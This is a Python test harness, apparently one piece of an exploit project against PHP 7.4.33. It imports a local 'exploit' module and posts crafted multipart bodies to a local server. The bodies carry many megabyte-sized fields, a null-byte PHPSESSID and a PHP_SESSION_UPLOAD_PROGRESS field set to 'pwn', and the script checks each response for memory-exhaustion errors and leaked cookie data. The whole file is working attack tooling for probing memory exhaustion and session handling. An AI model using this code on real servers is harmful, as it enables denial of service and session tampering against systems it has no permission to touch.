"""Test if 7.4.33 can OOM via cumulative allocation (many 1MB fields)."""
import sys, os, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=90.0, verbose=False)

def test(nfields, fsize_mb, label):
    parts = [{"name": f"m{i:04d}", "data": b"M" * (fsize_mb * 1024 * 1024)} for i in range(nfields)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    body = E.build_multipart(parts, b"S" * 17)
    try:
        resp = t.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
        oom = b"Allowed memory size" in resp or b"Fatal error" in resp
        raw = E.parse_cookie(resp)
        print(f"{label}: oom={oom} cookie={len(raw)}B body[:100]={resp[:100]!r}", flush=True)
    except Exception as e:
        print(f"{label}: EXC {e}", flush=True)
    time.sleep(0.5)

test(12, 1, "12 x 1MB = 12MB total")
test(8, 2, "8 x 2MB = 16MB total")
test(20, 1, "20 x 1MB = 20MB total")
